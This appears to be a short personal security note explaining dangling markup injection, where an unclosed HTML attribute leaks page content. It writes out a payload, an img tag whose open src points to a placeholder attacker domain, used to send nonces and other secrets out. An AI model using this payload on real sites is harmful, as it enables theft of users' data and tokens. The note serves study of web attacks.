# Dangling markup injection

So basically if we have an html injection in a page lets say that we have control over 
```<input type="text" name="input" value="CONTROLLABLE DATA HERE```, we can basically give a payload like ```"><img src='//attacker-website.com?```, so what happens here is that since the src attribute isn't closed all the html that is there up until the next single qoute is treated as query parameter and is sent along with the request to the attackers domain using this we can leak valuable info such as nonce etc.
